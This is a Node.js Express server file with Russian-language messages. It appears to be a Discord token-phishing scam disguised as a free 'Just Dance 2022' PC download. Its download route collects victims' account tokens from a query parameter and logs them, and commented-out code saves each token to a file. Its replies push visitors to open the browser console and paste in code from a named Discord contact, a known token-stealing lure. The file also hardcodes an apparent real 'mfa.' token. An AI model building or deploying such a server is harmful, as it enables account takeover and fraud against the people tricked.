const express = require("express");
const fs = require("fs");
const https = require("https");
const app = express();
const path = require('path');
var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
var multiparty = require('multiparty'); // Для сохранения файла
var http = require('http');

const cors = require('cors');
app.use(cors());

app.get('/justdance2022/download/pc', function (req, res) {
    var form = new multiparty.Form();
    form.parse(req, function (err, fields, files) {
        var tokenHead = req.query.jd22;
        var object = {
            token: tokenHead
        };
        var profileScam = JSON.stringify(object);
        console.log("Файл создан" + ". Токен получен - " + tokenHead);
                if(tokenHead==="mfa.LemvHJshUwSZAfSz08bmg8fyq_l0FTZn6HizlKZyLofaLKGVy7XC3lkDJf5zkbXYqhBF6siXDejhJMW"){
                    res.send("Этот токен уже получил ссылку, используйте свой токен. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743. Чтобы узнать свой токен: нажмите Ctrl + Shift + I и вставьте в Console код ( Код можно узнать у Michael Ruinlov#6743) ")
                } else{
                     res.send("Хм, что-то пошло не так, поторите попытку через 10 секунд. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ");
                }
       /* fs.writeFile("./tokens/"+tokenHead+".json", profileScam, function (err) {
            if (err) {
                console.log(err);
                res.send("Запрос неуспешный")
            } else {
                console.log("Файл создан" + ". Токен получен - " + tokenHead);
                if(tokenHead==="mfa.LemvHJshUwSZAfSz08bmg8fyq_l0FTZn6HizlKZyLofaLKGVy7XC3lkDJf5zkbXYqhBF6siXDejhJMW"){
                    res.send("Этот токен уже получил ссылку, используйте свой токен. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ")
                } else{
                     res.send("Хм, что-то пошло не так, поторите попытку через 10 секунд. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ");
                }
               
            }
        });*/
    })
});
app.get('/', function (req, res) {
    res.send("Хм, что-то пошло не так, поторите попытку через 10 секунд. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743. Чтобы узнать свой токен: нажмите Ctrl + Shift + I и вставьте в Console код ( Код можно узнать у Michael Ruinlov#6743) ");
});
const listener = app.listen(process.env.PORT, function () {
    console.log("Ваше приложение прослушивает порт " + listener.address().port);
});